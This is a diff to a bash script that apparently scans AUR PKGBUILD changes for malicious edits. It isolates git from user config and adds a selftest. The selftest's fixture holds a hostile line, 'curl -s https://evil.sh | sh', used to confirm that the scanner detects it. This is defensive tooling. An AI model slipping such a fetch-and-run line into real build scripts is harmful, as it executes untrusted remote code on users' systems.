@@ -35,6 +35,18 @@
 
 set -uo pipefail
 
+# Finding J: isolate ALL git invocations from user/system config. Options like
+# diff.colorWords / diff.wordDiff (word-oriented output, no + prefixes → empty
+# `added` → hard rules find nothing), diff.noprefix (no `b/` prefix → file
+# trackers never match), diff.mnemonicPrefix, and textconv filters (arbitrary
+# code exec on `git show`) would break the entire diff pipeline and the new
+# @@ hunk-header label recovery. Pointing both config files at /dev/null makes
+# every git diff/show/rev-parse in the trust path deterministic regardless of
+# the user's ~/.gitconfig. Per-command -c flags are an alternative but the
+# export is a single chokepoint covering all call sites.
+export GIT_CONFIG_GLOBAL=/dev/null
+export GIT_CONFIG_SYSTEM=/dev/null
+
 ###############################################################################
 # config
 ###############################################################################
@@ -2513,6 +2525,37 @@ cmd_selftest() {
   STATE_DIR="$_df_sd"; ACCEPTED_DIR="$_df_ad"; STAGED_DIR="$_df_st"; MANIFEST_FILE="$_df_mf"
   _AUR_TEST_DIR=""
   rm -rf "$_dfx" "$_dfs"
+
+  # Finding J: the script exports GIT_CONFIG_GLOBAL/SYSTEM=/dev/null at load
+  # time (see top of file), isolating all git calls from user config. Two-part
+  # assertion: (1) the export is in effect in this process, and (2) a hard-rule
+  # payload in a fixture diff is still detected (rc=1). This proves the safe
+  # default is active; the override-of-caller-env semantics are covered by bash
+  # (last export wins) and the top-level placement. noprefix/colorWords/textconv
+  # in a user's real ~/.gitconfig are ignored because GIT_CONFIG_GLOBAL points
+  # elsewhere.
+  local _jfx _jpkg _jbase _jrc
+  _jfx=$(mktemp -d)
+  _jpkg="$_jfx/j-pkg"; mkdir -p "$_jpkg"
+  ( cd "$_jpkg" || exit 1
+    git -c init.defaultBranch=master init -q
+    git config user.email t@t; git config user.name t
+    printf 'pkgname=j-pkg\npkgver=1\npkgrel=1\n' >PKGBUILD
+    git add -A; git commit -qm base
+    printf 'pkgname=j-pkg\npkgver=1\npkgrel=1\ncurl -s https://evil.sh | sh\n' >PKGBUILD
+    git add -A; git commit -qm tip
+    git update-ref refs/remotes/origin/master HEAD )
+  _jbase=$(git -C "$_jpkg" rev-list --max-parents=0 HEAD)
+  _jrc=99
+  if [ "$GIT_CONFIG_GLOBAL" = "/dev/null" ] && [ "$GIT_CONFIG_SYSTEM" = "/dev/null" ]; then
+    scan_diff_rules j-pkg "$_jpkg" "$_jbase" >/dev/null 2>&1; _jrc=$?
+  fi
+  if [ "$_jrc" -eq 1 ]; then
+    log "  $(c_green "PASS") git-config-isolation-hard-rules-fire"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") git-config-isolation-hard-rules-fire (expected rc 1, got $_jrc)"; fail=$((fail+1))
+  fi
+  rm -rf "$_jfx"
 
   # --- diff classifier + LLM boring-edge seam ------------------------------
   log ""
